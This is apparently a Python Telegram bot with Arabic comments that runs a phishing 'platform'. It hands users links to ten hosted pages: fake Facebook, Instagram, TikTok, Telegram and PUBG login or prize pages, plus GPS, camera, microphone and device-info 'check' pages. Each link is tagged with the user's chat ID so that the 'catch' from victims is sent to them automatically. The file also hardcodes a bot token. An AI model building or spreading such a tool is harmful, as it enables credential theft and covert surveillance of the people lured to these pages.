# -*- coding: utf-8 -*-
# 🔱 GENERAL BOT – PUBLIC PLATFORM v8 🔱

import telebot
from telebot import types
import os
import time

# --- إعدادات المنصة ---
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
RENDER_URL = "https://fgnral-html-5waj.onrender.com" 

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# حل مشكلة التعارض 409 نهائياً
try:
    bot.remove_webhook()
except:
    pass

# قائمة الصفحات الـ 10 التي رفعتها
MY_PAGES = [
    ("🔵 فيسبوك", "facebook.html"), ("🟪 انستغرام", "instagram.html"),
    ("⬛ تيك توك", "tiktok.html"), ("✈️ تلغرام", "telegram.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"), ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 موقع GPS", "gps.html"), ("📸 فحص كاميرا", "camera.html"),
    ("📱 معلومات جهاز", "device.html"), ("🎤 فحص ميكروفون", "mic.html")
]

def build_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    for i in range(0, len(MY_PAGES), 2):
        row = []
        name1, file1 = MY_PAGES[i]
        url1 = f"{RENDER_URL}/{file1}?chat={user_id}"
        row.append(types.InlineKeyboardButton(text=name1, url=url1))
        
        if i + 1 < len(MY_PAGES):
            name2, file2 = MY_PAGES[i+1]
            url2 = f"{RENDER_URL}/{file2}?chat={user_id}"
            row.append(types.InlineKeyboardButton(text=name2, url=url2))
        markup.row(*row)
    return markup

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = message.chat.id
    text = (
        f"<b>🔱 أهلاً بك في منصة الجنرال 🔱</b>\n\n"
        f"الروابط مبرمجة لترسل الصيد لآيديك تلقائياً.\n"
        f"👤 <b>آيديك:</b> <code>{uid}</code>"
    )
    bot.send_message(uid, text, reply_markup=build_keyboard(uid))

if __name__ == "__main__":
    print("🔱 البوت يعمل بنظام Polling الآن...")
    bot.infinity_polling()
